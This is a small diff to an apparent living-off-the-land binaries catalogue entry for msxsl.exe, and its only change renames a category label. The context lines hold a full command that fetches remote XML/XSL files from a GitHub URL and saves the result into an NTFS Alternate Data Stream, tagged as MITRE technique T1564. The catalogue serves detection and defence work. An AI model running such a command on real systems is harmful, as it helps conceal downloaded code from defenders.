@@ -42,7 +42,7 @@ Commands:
   - Command: msxsl.exe https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl -o <filename>:ads-name
     Description: Using remote XML and XSL files, save the transformed XML file to an Alternate Data Stream (ADS).
     Usecase: Download a file from the internet and save it to an NTFS Alternate Data Stream.
-    Category: Alternate data streams
+    Category: ADS
     Privileges: User
     MitreID: T1564
     OperatingSystem: Windows
